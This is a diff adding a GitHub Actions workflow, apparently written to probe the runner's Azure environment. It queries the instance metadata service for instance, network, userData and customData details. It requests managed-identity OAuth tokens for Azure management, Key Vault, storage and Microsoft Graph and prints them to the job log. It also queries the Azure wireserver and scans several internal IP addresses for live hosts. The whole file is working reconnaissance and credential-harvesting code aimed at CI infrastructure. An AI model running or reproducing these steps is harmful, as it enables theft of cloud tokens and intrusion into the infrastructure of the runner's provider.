@@ -1,0 +1,74 @@
+name: Azure IMDS Deep Probe
+on: workflow_dispatch
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Azure IMDS Deep Probe
+        run: |
+          echo "=== COMPREHENSIVE AZURE IMDS PROBE ==="
+          BASE="http://169.254.169.254/metadata"
+          HDR="-H Metadata:true"
+          
+          echo "--- /instance (full, already confirmed) ---"
+          curl -s $HDR "$BASE/instance?api-version=2021-02-01&format=json" | python3 -m json.tool 2>/dev/null | head -80
+          
+          echo ""
+          echo "--- /instance/network ---"
+          curl -s $HDR "$BASE/instance/network?api-version=2021-02-01&format=json" | python3 -m json.tool 2>/dev/null
+          
+          echo ""
+          echo "--- /instance/compute/userData ---"
+          curl -s $HDR "$BASE/instance/compute/userData?api-version=2021-03-01&format=text" | head -20
+          
+          echo ""
+          echo "--- /instance/compute/customData ---"
+          curl -s $HDR "$BASE/instance/compute/customData?api-version=2021-02-01&format=text" | head -20
+          
+          echo ""
+          echo "--- /identity/info ---"
+          curl -s $HDR "$BASE/identity/info?api-version=2018-02-01" | head -20
+          
+          echo ""
+          echo "--- /identity/oauth2/token (management.azure.com) ---"
+          curl -s $HDR "$BASE/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | head -20
+          
+          echo ""
+          echo "--- /identity/oauth2/token (vault.azure.net) ---"
+          curl -s $HDR "$BASE/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | head -20
+          
+          echo ""
+          echo "--- /identity/oauth2/token (storage.azure.com) ---"
+          curl -s $HDR "$BASE/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | head -20
+          
+          echo ""
+          echo "--- /identity/oauth2/token (graph.microsoft.com) ---"
+          curl -s $HDR "$BASE/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | head -20
+          
+          echo ""
+          echo "--- /instance/compute/tagsList ---"
+          curl -s $HDR "$BASE/instance/compute/tagsList?api-version=2021-02-01&format=json" | python3 -m json.tool 2>/dev/null
+          
+          echo ""
+          echo "--- /loadbalancer ---"
+          curl -s $HDR "$BASE/loadbalancer?api-version=2021-02-01&format=json" | head -20
+          
+          echo ""
+          echo "--- /versions ---"
+          curl -s $HDR "$BASE/versions" | head -20
+          
+          echo ""
+          echo "--- Wireserver 168.63.129.16 (Azure DNS/DHCP) ---"
+          curl -s --max-time 3 "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2012-11-30" | head -20 || echo "TIMEOUT"
+          
+          echo ""
+          echo "--- Internal network scan (quick) ---"
+          for ip in 10.1.1.1 10.1.0.1 10.1.1.254 172.17.0.2 172.17.0.3; do
+            RESP=$(curl -s --max-time 2 --connect-timeout 1 "http://$ip/" 2>&1) || true
+            if [ -n "$RESP" ] && ! echo "$RESP" | grep -q "Connection refused\|timed out\|couldn't connect"; then
+              echo "[LIVE] $ip responded: $(echo "$RESP" | head -c 200)"
+            fi
+          done
+          
+          echo ""
+          echo "=== PROBE COMPLETE ==="
